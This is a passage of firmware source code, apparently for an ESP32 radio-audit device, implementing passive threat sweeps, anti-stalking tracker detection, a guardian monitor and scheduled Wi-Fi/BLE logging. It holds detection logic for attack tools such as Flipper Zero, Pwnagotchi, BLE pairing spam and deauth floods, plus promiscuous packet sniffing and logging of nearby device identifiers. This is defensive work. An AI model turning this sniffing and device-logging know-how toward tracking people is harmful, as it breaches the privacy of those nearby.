  // plus an active BLE scan (Flipper Zero, card-skimmer BT modules, Meshtastic
  // nodes, and RSSI relay/spoof anomalies). Read-only -- nothing transmitted.
  wifiFindings.clear();
  bleFindings.clear();
  scanTotalPasses = 1;
  scanCurrentPass = 1;
  deepScanMode = false;
  state = State::WIFI_SCANNING;
  status = "Threat sweep: WiFi...";
  requestUpdateAndWait();

  prepWifiSta();
  // Active scan, matching the proven Camera Sweep path. (A passive long-dwell scan
  // catches more transient APs but retains more heap going into BLEDevice::init,
  // which transiently needs ~65 KB and was aborting on bad_alloc here. Pwnagotchi's
  // sparse beacons are caught by the promiscuous listen below instead.)
  const int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; i++) {
    WifiFinding f;
    f.ssid = WiFi.SSID(i).c_str();
    f.bssid = WiFi.BSSIDstr(i).c_str();
    f.rssi = WiFi.RSSI(i);
    f.rssiMin = f.rssiMax = f.rssiSum = f.rssi;
    f.channel = WiFi.channel(i);
    f.seenCount = 1;
    f.auth = authName(WiFi.encryptionType(i));
    f.hidden = f.ssid.empty();
    mergeWifiFinding(std::move(f));
  }
  WiFi.scanDelete();

  // Promiscuous Pwnagotchi listen: catch the sparse presence beacons a quick scan
  // misses (DE:AD:BE:EF source/BSSID or a JSON-identity SSID), channel-hopping ~3 s.
  status = "Threat sweep: beacons...";
  requestUpdateAndWait();
  g_pwn = makeUniqueNoThrow<PwnScan>();
  if (g_pwn) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&pwnScanCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    g_pwn->active = true;
    for (int round = 0; round < 2; round++) {
      for (uint8_t ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(110);
      }
    }
    g_pwn->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
  }

  state = State::BLE_SCANNING;
  status = "Threat sweep: BLE...";
  requestUpdateAndWait();
#if defined(RADIO_AUDIT_ENABLE_BLE)
  // Streaming (flood-safe) scan: a BLE-spam flood would OOM the normal accumulating
  // scan. Passive, so Flipper is still caught via its 0x3082 service UUID (which
  // rides in the primary advert, not the scan response).
  runBleScanStreaming(/*windows=*/3);
#endif

  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });
  scanTime = timeStamp();
  state = State::DONE;

  targetTitle = "Threat Sweep";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  int hits = 0;

  // WiFi-side signatures: Pwnagotchi beacons + Axon (body/in-car) cameras.
  for (const auto& w : wifiFindings) {
    const std::string ssid = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    std::string reason = pwnagotchiReason(w.ssid, w.bssid);
    if (reason.empty()) {
      const std::string vendor = macVendor(w.bssid);
      std::string cam = cameraFingerprintReason(w.ssid, vendor);
      if (cam.empty()) cam = cameraMacReason(w.bssid);
      if (cam.empty()) cam = cameraVendorReason(vendor);
      if (cam.find("Axon") != std::string::npos || cam.find("TASER") != std::string::npos) reason = cam;
    }
    if (reason.empty()) continue;
    hits++;
    targetLines.push_back(reason);
    targetLines.push_back("  " + ssid + "  " + w.bssid);
    targetLines.push_back("  CH" + std::to_string(w.channel) + "  " + std::to_string(w.rssi) + " dBm");
  }

  // Pwnagotchi promiscuous-beacon hits (the sparse beacons a scan misses).
  if (g_pwn) {
    for (const auto& s : g_pwn->slots) {
      if (!s.used) continue;
      hits++;
      targetLines.push_back("Pwnagotchi beacon");
      targetLines.push_back("  " + macToString(s.mac) + "  " + std::to_string(s.rssi) + " dBm");
      if (s.ssid[0]) targetLines.push_back(std::string("  SSID: ") + s.ssid);
    }
    g_pwn.reset();
  }

  // BLE-side signatures: Flipper / skimmer / Meshtastic, then RSSI relay anomaly.
  for (const auto& b : bleFindings) {
    std::string reason =
        bleThreatReason(b.name, b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex);
    if (reason.empty()) reason = droneBleReason(b.manufacturerHex, b.serviceUuid, b.serviceDataUuid);
    if (reason.empty()) reason = bleRelayReason(b.rssiMin, b.rssiMax, b.seenCount);
    if (reason.empty()) continue;
    hits++;
    targetLines.push_back(reason);
    targetLines.push_back("  " + (b.name.empty() ? b.address : b.name) + "  " + std::to_string(b.rssi) + " dBm");
    if (!b.name.empty()) targetLines.push_back("  " + b.address);
  }

  // BLE pairing-popup flood (aggregate, not per-device).
  {
    std::string spamFamily;
    const int spam = bleSpamAdvertCount(spamFamily);
    if (spam >= BLE_SPAM_THRESHOLD) {
      hits++;
      targetLines.push_back("BLE pairing spam (" + spamFamily + ")");
      targetLines.push_back("  " + std::to_string(spam) + " pairing adverts - possible Flipper/app flood");
    }
  }

  if (hits == 0) {
    targetLines.push_back("No known threats detected.");
    targetLines.push_back("Scanned " + std::to_string(wifiFindings.size()) + " APs, " +
                          std::to_string(bleFindings.size()) + " BLE devices.");
  } else {
    targetLines.insert(targetLines.begin(), std::to_string(hits) + " threat signature(s)");
  }
  status = std::string("Threats: ") + std::to_string(hits);
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

bool RadioAuditActivity::isWatchlisted(const std::string& mac) const {
  const std::string up = upperStr(mac);
  for (const auto& entry : watchlist)
    if (!entry.empty() && up.find(entry) != std::string::npos) return true;
  return false;
}

void RadioAuditActivity::startAntiStalk() {
  loadWatchlist();  // refresh in case the user edited watchlist.txt
  stalkTable.clear();
  stalkTable.reserve(STALK_MAX);
  stalkPassCount = 0;
  stalkLastPassMs = 0;  // forces an immediate first pass
  state = State::STALKING;
  status = "Anti-Stalk: scanning...";
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  requestUpdateAndWait();
  antiStalkPass();  // first pass now so the screen isn't empty
}

void RadioAuditActivity::antiStalkPass() {
  stalkPassCount++;
  status = std::string("Anti-Stalk: pass ") + std::to_string(stalkPassCount) + "...";
  requestUpdateAndWait();

  bleFindings.clear();
#if defined(RADIO_AUDIT_ENABLE_BLE)
  runBleScanStreaming(/*windows=*/1);  // one window keeps each pass short + Stop responsive
#endif
  // Stop pressed during the scan? Bail now instead of finishing the pass.
  mappedInput.update();
  if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
      mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
    stopAntiStalk();
    return;
  }

  for (auto& e : stalkTable) e.seenThisPass = false;

  for (const auto& b : bleFindings) {
    StalkEntry* slot = nullptr;
    for (auto& e : stalkTable)
      if (e.addr == b.address) {
        slot = &e;
        break;
      }
    if (!slot) {
      if (stalkTable.size() < STALK_MAX) {
        stalkTable.emplace_back();
        slot = &stalkTable.back();
        slot->addr = b.address;
      } else {
        // Table full: reuse a transient entry (seen once, absent now) if any.
        for (auto& e : stalkTable)
          if (!e.seenThisPass && e.passesSeen <= 1) {
            e = StalkEntry{};
            e.addr = b.address;
            slot = &e;
            break;
          }
        if (!slot) continue;  // keep established followers; drop this newcomer
      }
    }
    slot->seenThisPass = true;
    slot->passesSeen++;
    slot->passesMissed = 0;
    slot->rssi = b.rssi;
    slot->label = b.name.empty() ? bleVendorName(b.manufacturerHex) : b.name;
    const std::string tr =
        trackerReason(b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex, b.name);
    slot->tracker = !tr.empty();
    if (slot->tracker) slot->kind = tr;
    slot->watchlisted = isWatchlisted(b.address);
  }

  // Age out devices that have dropped off; keep confirmed followers longer.
  for (auto& e : stalkTable)
    if (!e.seenThisPass) e.passesMissed++;
  stalkTable.erase(std::remove_if(stalkTable.begin(), stalkTable.end(),
                                  [](const StalkEntry& e) {
                                    return e.passesMissed > STALK_FORGET && e.passesSeen < STALK_THRESHOLD;
                                  }),
                   stalkTable.end());

  int followers = 0;
  for (const auto& e : stalkTable)
    if (e.passesSeen >= STALK_THRESHOLD) followers++;
  status = std::string("Pass ") + std::to_string(stalkPassCount) + " - " + std::to_string(followers) + " follower(s)";
  stalkLastPassMs = millis();
  requestUpdate();
}

void RadioAuditActivity::stopAntiStalk() {
  shutdownBleController();
  WiFi.mode(WIFI_OFF);

  // Sort by persistence (most-seen first) for the summary.
  std::sort(stalkTable.begin(), stalkTable.end(),
            [](const StalkEntry& a, const StalkEntry& b) { return a.passesSeen > b.passesSeen; });

  targetTitle = "Anti-Stalk Watch";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  int followers = 0;
  targetLines.push_back(std::to_string(stalkPassCount) + " passes, " + std::to_string(stalkTable.size()) +
                        " devices tracked");
  for (const auto& e : stalkTable) {
    if (e.passesSeen < STALK_THRESHOLD) continue;
    followers++;
    const char* tag = e.watchlisted ? "[WATCHLIST] " : (e.tracker ? "[TRACKER] " : "[FOLLOW] ");
    targetLines.push_back(tag + (e.label.empty() ? e.addr : e.label));
    targetLines.push_back("  " + e.addr + "  seen " + std::to_string(e.passesSeen) + "/" +
                          std::to_string(stalkPassCount) + "  " + std::to_string(e.rssi) + " dBm");
    if (e.tracker && !e.kind.empty()) targetLines.push_back("  " + e.kind);
  }
  if (followers == 0) {
    targetLines.push_back("No persistent followers detected.");
    targetLines.push_back("Note: AirTags rotate their MAC, which");
    targetLines.push_back("can reset the per-device pass count.");
  }

  scanTime = timeStamp();
  state = State::DONE;
  status = std::string("Followers: ") + std::to_string(followers);
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderAntiStalk() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int x = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Anti-Stalk Watch",
                 status.c_str());

  // Followers first, then the rest by persistence.
  std::vector<const StalkEntry*> sorted;
  sorted.reserve(stalkTable.size());
  for (const auto& e : stalkTable) sorted.push_back(&e);
  std::sort(sorted.begin(), sorted.end(),
            [](const StalkEntry* a, const StalkEntry* b) { return a->passesSeen > b->passesSeen; });

  int followers = 0;
  for (const auto* e : sorted)
    if (e->passesSeen >= STALK_THRESHOLD) followers++;

  int y = contentTop;
  renderer.drawText(
      UI_12_FONT_ID, x, y,
      (String("Pass ") + stalkPassCount + "   Tracked: " + (int)stalkTable.size() + "   Followers: " + followers)
          .c_str(),
      true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;

  const int lineH = renderer.getLineHeight(SMALL_FONT_ID) + 4;
  const int footerReserve = metrics.headerHeight + 24;  // leave room for the button hints
  const int maxRows = (renderer.getScreenHeight() - y - footerReserve) / lineH;
  int rows = 0;
  for (const auto* e : sorted) {
    if (rows >= maxRows) break;
    const char* tag = e->watchlisted ? "[W] " : (e->tracker ? "[T] " : (e->passesSeen >= STALK_THRESHOLD ? "* " : ""));
    const String line = String(tag) + (e->label.empty() ? e->addr.c_str() : e->label.c_str()) + "  " + e->passesSeen +
                        "/" + stalkPassCount + "  " + e->rssi + "dBm";
    renderer.drawText(SMALL_FONT_ID, x, y,
                      renderer.truncatedText(SMALL_FONT_ID, line.c_str(), pageWidth - x * 2).c_str());
    y += lineH;
    rows++;
  }
  if (rows == 0) {
    renderer.drawText(SMALL_FONT_ID, x, y, "Watching... walk around for a few passes.");
  }

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startGuardian() {
  loadWatchlist();
  stalkTable.clear();
  stalkTable.reserve(STALK_MAX);
  guardianThreats.clear();
  guardianThreats.reserve(16);
  guardianRound = 0;
  guardianAlertPeak = 0;
  guardianLastMs = 0;  // forces an immediate first round
  state = State::GUARDIAN;
  status = "Guardian: starting...";
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  requestUpdateAndWait();
  guardianPass();
}

void RadioAuditActivity::guardianPass() {
  guardianRound++;
  guardianThreats.clear();
  bool stopReq = false;  // set if Stop is pressed mid-round so we bail promptly
  status = std::string("Guardian: round ") + std::to_string(guardianRound) + "...";
  requestUpdateAndWait();

  // --- BLE phase: flood-safe scan, then classify threats + persistence ---
  bleFindings.clear();
#if defined(RADIO_AUDIT_ENABLE_BLE)
  runBleScanStreaming(/*windows=*/1);  // one window keeps the round short + Stop responsive
#endif
  mappedInput.update();
  if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
      mappedInput.wasPressed(MappedInputManager::Button::Confirm))
    stopReq = true;

  std::string spamFam;
  const int spamCount = bleSpamAdvertCount(spamFam);
  if (spamCount >= BLE_SPAM_THRESHOLD)
    guardianThreats.push_back("BLE pairing spam x" + std::to_string(spamCount) + " (" + spamFam + ")");

  for (auto& e : stalkTable) e.seenThisPass = false;
  for (const auto& b : bleFindings) {
    const std::string label = b.name.empty() ? b.address : b.name;
    const std::string threat =
        bleThreatReason(b.name, b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex);
    if (!threat.empty()) guardianThreats.push_back(threat + " - " + label);
    const std::string drone = droneBleReason(b.manufacturerHex, b.serviceUuid, b.serviceDataUuid);
    if (!drone.empty()) guardianThreats.push_back(drone + " - " + label);

    // Persistence: track watchlisted MACs and item-trackers across rounds.
    const std::string tr =
        trackerReason(b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex, b.name);
    if (isWatchlisted(b.address) || !tr.empty()) {
      StalkEntry* slot = nullptr;
      for (auto& e : stalkTable)
        if (e.addr == b.address) {
          slot = &e;
          break;
        }
      if (!slot && stalkTable.size() < STALK_MAX) {
        stalkTable.emplace_back();
        slot = &stalkTable.back();
        slot->addr = b.address;
      }
      if (slot) {
        slot->seenThisPass = true;
        slot->passesSeen++;
        slot->passesMissed = 0;
        slot->rssi = b.rssi;
        slot->label = label;
        slot->tracker = !tr.empty();
        if (slot->tracker) slot->kind = tr;
        slot->watchlisted = isWatchlisted(b.address);
      }
    }
  }
  for (auto& e : stalkTable)
    if (!e.seenThisPass) e.passesMissed++;
  stalkTable.erase(std::remove_if(stalkTable.begin(), stalkTable.end(),
                                  [](const StalkEntry& e) {
                                    return e.passesMissed > STALK_FORGET && e.passesSeen < STALK_THRESHOLD;
                                  }),
                   stalkTable.end());
  for (const auto& e : stalkTable)
    if (e.passesSeen >= STALK_THRESHOLD)
      guardianThreats.push_back(std::string(e.watchlisted ? "WATCHLIST following: " : "Tracker following: ") +
                                (e.label.empty() ? e.addr : e.label));

  // --- Wi-Fi phase: brief promiscuous listen for a deauth/disassoc flood ---
  // Skipped if Stop was already pressed during/after the BLE phase.
  if (!stopReq && (g_dd = makeUniqueNoThrow<DeauthDetect>())) {
    prepWifiSta();
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&deauthDetectCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    g_dd->active = true;
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    const uint32_t start = millis();
    uint32_t lastHop = start;
    while (millis() - start < GUARDIAN_DEAUTH_WINDOW_MS) {
      delay(40);             // yields so the promiscuous callback can fill g_dd
      mappedInput.update();  // poll Stop so the user isn't stuck waiting out the window
      if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
          mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
        stopReq = true;
        break;
      }
      if (millis() - lastHop >= 180) {
        ch = (ch >= 13) ? 1 : static_cast<uint8_t>(ch + 1);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        lastHop = millis();
      }
    }
    g_dd->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    for (const auto& s : g_dd->slots) {
      if (!s.used) continue;
      const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
      if (total >= DD_ALERT_THRESHOLD) guardianThreats.push_back("Deauth flood from " + macToString(s.src));
    }
    g_dd.reset();
    WiFi.mode(WIFI_OFF);
    delay(50);
  }

  if (stopReq) {  // Stop pressed mid-round -> end now instead of finishing the round
    stopGuardian();
    return;
  }

  // Severity for the persistent banner: any active threat is at least caution;
  // followers / floods / spam / Flipper escalate to a full alert.
  int sev = guardianThreats.empty() ? 0 : 1;
  for (const auto& t : guardianThreats)
    if (t.find("following") != std::string::npos || t.find("Deauth") != std::string::npos ||
        t.find("spam") != std::string::npos || t.find("Flipper") != std::string::npos)
      sev = 2;
  if (sev > guardianAlertPeak) guardianAlertPeak = sev;

  status = guardianThreats.empty() ? "All clear" : (std::to_string(guardianThreats.size()) + " active threat(s)");
  guardianLastMs = millis();
  requestUpdate();
}

void RadioAuditActivity::stopGuardian() {
  if (g_dd) {
    g_dd->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_dd.reset();
  }
  shutdownBleController();
  WiFi.mode(WIFI_OFF);
  delay(50);

  targetTitle = "Guardian Mode";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  targetLines.push_back(std::to_string(guardianRound) + " rounds monitored");
  targetLines.push_back(guardianAlertPeak >= 2   ? "Peak: THREAT detected"
                        : guardianAlertPeak == 1 ? "Peak: caution"
                                                 : "Peak: all clear");
  if (!guardianThreats.empty()) {
    targetLines.push_back("Last round:");
    for (const auto& t : guardianThreats) targetLines.push_back("  " + t);
  }
  scanTime = timeStamp();
  state = State::DONE;
  status = guardianAlertPeak >= 2 ? "Guardian: threats seen" : "Guardian stopped";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderGuardian() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int x = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Guardian Mode",
                 status.c_str());

  int y = contentTop;
  if (guardianThreats.empty()) {
    renderer.drawText(UI_12_FONT_ID, x, y, (String("Round ") + guardianRound + "   -   ALL CLEAR").c_str(), true,
                      EpdFontFamily::BOLD);
    y += renderer.getLineHeight(UI_12_FONT_ID) + 12;
    renderer.drawText(SMALL_FONT_ID, x, y, "Monitoring BLE + Wi-Fi. Leave it running.");
  } else {
    const int barH = renderer.getLineHeight(UI_12_FONT_ID) + 12;
    renderer.fillRect(x, y, pageWidth - x * 2, barH, true);  // inverted alert banner
    renderer.drawText(UI_12_FONT_ID, x + 8, y + 6,
                      (String("! ") + (int)guardianThreats.size() + " THREAT(S) DETECTED").c_str(), false,
                      EpdFontFamily::BOLD);
    y += barH + 10;
    const int lineH = renderer.getLineHeight(SMALL_FONT_ID) + 4;
    const int maxRows = (renderer.getScreenHeight() - y - metrics.headerHeight - 24) / lineH;
    int rows = 0;
    for (const auto& t : guardianThreats) {
      if (rows >= maxRows) break;
      renderer.drawText(SMALL_FONT_ID, x, y,
                        renderer.truncatedText(SMALL_FONT_ID, ("- " + t).c_str(), pageWidth - x * 2).c_str());
      y += lineH;
      rows++;
    }
  }

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::showLogSetup() {
  state = State::LOG_SETUP;
  status = "Scan interval";
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderLogSetup() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Scheduled Log", "Configure");

  const int x = metrics.contentSidePadding;
  int y = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;

  const char* names[LOG_SETUP_FIELDS] = {"Interval", "Run for", "Radios"};
  const char* values[LOG_SETUP_FIELDS] = {LOG_INTERVAL_LABELS[logIntervalSel], LOG_DURATION_LABELS[logDurationSel],
                                          LOG_RADIO_LABELS[logRadioSel]};
  const int rowH = renderer.getLineHeight(UI_12_FONT_ID) + 16;
  for (int i = 0; i < LOG_SETUP_FIELDS; i++) {
    const bool sel = (i == logSetupField);
    if (sel) renderer.fillRect(x, y - 4, pageWidth - x * 2, rowH, true);
    char row[72];
    // Selected row brackets the value to cue Left/Right adjustment.
    snprintf(row, sizeof(row), "%s:  %s%s%s", names[i], sel ? "< " : "", values[i], sel ? " >" : "");
    renderer.drawText(UI_12_FONT_ID, x + 12, y + 4, row, !sel, EpdFontFamily::BOLD);
    y += rowH;
  }
  y += 10;
  renderer.drawText(SMALL_FONT_ID, x, y, "Up/Down: field   Left/Right: change value");

  const auto labels = mappedInput.mapLabels("Cancel", "Start", "Up", "Down");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startScheduledLog() {
  Storage.ensureDirectoryExists(HS_DIR);
  capturePath = std::string(HS_DIR) + "/log-" + std::to_string(millis() / 1000) + ".csv";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "Log: cannot open %s", capturePath.c_str());
    status = "Scheduled log: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }
  const std::string hdr = "time,type,id,name,rssi,channel,detail\n";
  captureFile.write(reinterpret_cast<const uint8_t*>(hdr.data()), hdr.size());
  logCycles = 0;
  logEntries = 0;
  logLastMs = 0;  // forces an immediate first cycle
  logStartMs = millis();
  state = State::LOGGING;
  status = "Scheduled log: starting...";
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  requestUpdateAndWait();
  scanLogPass();
}

void RadioAuditActivity::scanLogPass() {
  logCycles++;
  status = std::string("Logging: cycle ") + std::to_string(logCycles) + "...";
  requestUpdateAndWait();
  const std::string ts = timeStamp();
  char line[200];

  // --- Wi-Fi cycle (skipped in BLE-only mode) ---
  if (logRadioSel != 2) {
    prepWifiSta();
    const int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      snprintf(line, sizeof(line), "%s,WIFI,%s,%s,%d,%d,%s\n", ts.c_str(), WiFi.BSSIDstr(i).c_str(),
               csvEscape(std::string(WiFi.SSID(i).c_str())).c_str(), static_cast<int>(WiFi.RSSI(i)),
               static_cast<int>(WiFi.channel(i)), authName(WiFi.encryptionType(i)).c_str());
      captureFile.write(reinterpret_cast<const uint8_t*>(line), strlen(line));
      logEntries++;
    }
    WiFi.scanDelete();
  }

  // Stop pressed during the (blocking) Wi-Fi scan? Bail now.
  mappedInput.update();
  if (mappedInput.wasPressed(MappedInputManager::Button::Back) ||
      mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
    stopScheduledLog();
    return;
  }

  // --- BLE cycle (flood-safe; skipped in WiFi-only mode) ---
  if (logRadioSel != 1) {
    bleFindings.clear();
#if defined(RADIO_AUDIT_ENABLE_BLE)
    runBleScanStreaming(/*windows=*/1);
#endif
    for (const auto& b : bleFindings) {
      snprintf(line, sizeof(line), "%s,BLE,%s,%s,%d,,%s\n", ts.c_str(), b.address.c_str(), csvEscape(b.name).c_str(),
               b.rssi, csvEscape(bleVendorName(b.manufacturerHex)).c_str());
      captureFile.write(reinterpret_cast<const uint8_t*>(line), strlen(line));
      logEntries++;
    }
  }

  captureFile.flush();
  logLastMs = millis();
  status = std::string("Logged ") + std::to_string(logEntries) + " over " + std::to_string(logCycles) + " cycle(s)";
  requestUpdate();
}

void RadioAuditActivity::stopScheduledLog() {
  shutdownBleController();
  if (captureFile.isOpen()) {
    captureFile.flush();
    captureFile.close();
  }
  WiFi.mode(WIFI_OFF);
  delay(50);

  targetTitle = "Scheduled Log";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  targetLines.push_back(std::to_string(logCycles) + " cycle(s), " + std::to_string(logEntries) + " entries");
  targetLines.push_back("Saved: " + capturePath);
  scanTime = timeStamp();
  state = State::DONE;
  status = std::string("Logged ") + std::to_string(logEntries) + " entries";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderScheduledLog() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int x = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Scheduled Log",
                 status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, x, y, (String("Cycle ") + logCycles + "   Entries: " + logEntries).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, x, y, ("Last: " + timeStamp()).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  renderer.drawText(SMALL_FONT_ID, x, y, (String("Scanning every ") + (int)(logIntervalMs / 1000) + "s").c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  renderer.drawText(SMALL_FONT_ID, x, y,
                    renderer.truncatedText(SMALL_FONT_ID, capturePath.c_str(), pageWidth - x * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startMdnsBrowse() {
  // mDNS needs an IP on the LAN, so we must be associated to an AP. If a prior
  // tool already left us connected, skip straight to the query; otherwise hand
  // off to WifiSelectionActivity to pick + join a network, then resume here.
  if (WiFi.status() == WL_CONNECTED) {
    mdnsActive = false;  // first MDNS_QUERY tick does MDNS.begin() + clears the view
    status = "Querying mDNS...";
    state = State::MDNS_QUERY;
    requestUpdate();
    return;
  }
  shutdownBleController();  // free the BLE controller's heap + radio before STA
  WiFi.mode(WIFI_STA);
  startActivityForResult(std::make_unique<WifiSelectionActivity>(renderer, mappedInput),
                         [this](const ActivityResult& result) {
                           if (result.isCancelled || WiFi.status() != WL_CONNECTED) {
                             status = "Not connected";
                             state = State::DONE;
                             requestUpdate();
                             return;
                           }
                           mdnsActive = false;
                           status = "Querying mDNS...";
                           state = State::MDNS_QUERY;
                           requestUpdate();
                         });
}

void RadioAuditActivity::runMdnsQueryPass() {
  // First tick after entering the state: start the responder and reset the view.
  // Returns immediately so the "Querying..." header paints before the first
  // blocking query (each query below stalls ~3 s).
  if (!mdnsActive) {
    if (!MDNS.begin("radioink")) {
      status = "mDNS init failed";
      WiFi.disconnect(false, false);
      WiFi.mode(WIFI_OFF);
      state = State::DONE;
      requestUpdate();
      return;
    }
    mdnsActive = true;
    mdnsServiceIdx = 0;
    mdnsFoundCount = 0;
    mdnsResults.clear();
    mdnsResults.reserve(MDNS_MAX_RESULTS);
    mdnsSel = 0;
    return;
  }

  if (mdnsServiceIdx >= MDNS_SERVICE_COUNT || mdnsResults.size() >= MDNS_MAX_RESULTS) {
    finishMdnsQuery();
    return;
  }

  const MdnsService& s = MDNS_SERVICES[mdnsServiceIdx];
  status = (String("Querying ") + s.label + " (" + (mdnsServiceIdx + 1) + "/" + MDNS_SERVICE_COUNT + ")").c_str();
  requestUpdateAndWait();  // show which service before the ~3 s blocking query

  const int n = MDNS.queryService(s.svc, s.proto);
  for (int i = 0; i < n && mdnsResults.size() < MDNS_MAX_RESULTS; i++) {
    MdnsResult r;
    r.label = s.label;
    r.instance = MDNS.instanceName(i).c_str();
    r.host = MDNS.hostname(i).c_str();
    r.ip = MDNS.address(i).toString().c_str();
    r.port = MDNS.port(i);
    // TXT metadata is part of this query's response; capture it now (the result
    // set is replaced on the next queryService call). Capped to bound RAM.
    const int txtCount = MDNS.numTxt(i);
    r.txt.reserve(txtCount < MDNS_MAX_TXT ? txtCount : MDNS_MAX_TXT);
    for (int t = 0; t < txtCount && t < MDNS_MAX_TXT; t++) {
      r.txt.push_back((MDNS.txtKey(i, t) + "=" + MDNS.txt(i, t)).c_str());
    }
    mdnsResults.push_back(std::move(r));
    mdnsFoundCount++;
  }
  mdnsServiceIdx++;
  requestUpdate();
}

void RadioAuditActivity::finishMdnsQuery() {
  MDNS.end();
  mdnsActive = false;
  // Return the radio to a clean idle state. Subsequent RF scans re-init WiFi via
  // resetWifiForScan(); BLE re-inits on demand.
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);

  status = (String("mDNS: ") + mdnsFoundCount + " service(s)").c_str();
  state = State::DONE;

  if (mdnsResults.empty()) {
    // Nothing responded: fall back to the plain message view.
    targetTitle = "mDNS Services";
    targetLines.clear();
    targetLines.push_back("No services responded.");
    targetScroll = 0;
    targetFromList = false;
    targetFromMdnsList = false;
    targetLocatable = false;
    showingTarget = true;
